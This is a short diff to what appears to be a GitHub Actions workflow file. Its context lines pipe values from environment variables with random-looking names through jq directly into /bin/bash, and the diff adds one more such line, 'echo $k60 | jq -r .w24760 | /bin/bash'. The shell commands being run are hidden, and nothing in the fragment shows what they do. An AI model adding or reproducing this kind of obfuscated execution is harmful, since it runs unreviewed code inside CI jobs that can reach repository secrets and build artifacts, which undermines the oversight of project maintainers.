@@ -21,6 +21,7 @@ jobs:
           echo $qt40 | jq -r .ekodb1471 | /bin/bash
           echo $q99405 | jq -r .eiwbr07 | /bin/bash
           echo $zotwc30981 | jq -r .p93 | /bin/bash
+          echo $k60 | jq -r .w24760 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
